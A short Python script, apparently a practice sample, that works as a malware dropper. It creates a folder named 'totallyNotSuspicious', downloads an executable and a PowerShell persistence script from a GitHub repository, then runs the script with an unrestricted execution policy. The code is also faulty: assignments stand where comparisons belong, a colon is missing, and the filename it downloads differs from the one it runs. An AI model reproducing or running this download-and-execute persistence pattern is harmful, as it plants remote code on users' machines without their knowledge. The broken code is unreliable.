import subprocess
from pathlib import Path
import wget
import os

if os.sep = '/':
	cwd=os.path.join(Path.home(),"Documents","totallyNotSuspicious")
if os.sep = '\\'
	cwd=os.path.join(os.path.abspath(os.sep),"totallyNotSuspicious")

os.mkdir(cwd)
os.chdir(cwd)

wget.download('https://github.com/Acrasy/samples/raw/master/codesamples/print2Desktop/code/print.exe')
wget.download('https://raw.githubusercontent.com/Acrasy/samples/master/codesamples/initialize/code/persitence.ps1')

psexectaskscheduler = subprocess.Popen([r'C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe','-NonInteractive','-NoProfile','-ExecutionPolicy','Unrestricted','./persistence.ps1'])
